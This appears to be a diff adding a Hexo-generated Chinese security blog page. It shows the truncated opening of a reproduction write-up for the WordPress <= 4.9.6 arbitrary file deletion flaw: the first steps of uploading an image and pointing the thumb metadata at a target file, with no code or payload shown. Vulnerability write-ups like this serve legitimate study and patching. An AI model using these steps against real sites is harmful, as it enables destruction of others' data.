+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.684Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Wordpress-lt-4-9-6-任意文件删除漏洞"><a href="#Wordpress-lt-4-9-6-任意文件删除漏洞" class="headerlink" title="Wordpress &lt;= 4.9.6 任意文件删除漏洞"></a>Wordpress &lt;= 4.9.6 任意文件删除漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>利用条件L：需要进入后台</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="添加新媒体"><a href="#添加新媒体" class="headerlink" title="添加新媒体"></a>添加新媒体</h3><p>访问<a target="_blank" rel="noopener" href="http://0-sec.org/wp-admin/upload.php%EF%BC%8C%E7%84%B6%E5%90%8E%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E3%80%82">http://0-sec.org/wp-admin/upload.php，然后上传图片。</a></p>
+<p><img src="/resource/Wordpress%3C=4.9.6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<h3 id="将-meta-39-thumb-39-设置为我们要删除的文件"><a href="#将-meta-39-thumb-39-设置为我们要删除的文件" class="headerlink" title="将$ meta [&#39;thumb&#39;]设置为我们要删除的文件"></a>将$ meta [&#39;thumb&#39;]设置为我们要删除的文件</h3><h4 id="单击我们在中上传的图像Step-2，并记住图像的ID。"><a href="#单击我们在中上传的图像Step-2，并记住图像的ID。" class="headerlink" title="单击我们在中上传的图像Step 2，并记住图像的ID。"></a>单击我们在中上传的图像Step 2，并记住图像的ID。</h4>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qygm00m2y8v1ajka8inq" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/21/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><a class="page-number" href="/page/21/">21</a><span class="page-number current">22</span><a class="page-number" href="/page/23/">23</a><a class="page-number" href="/page/24/">24</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/23/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
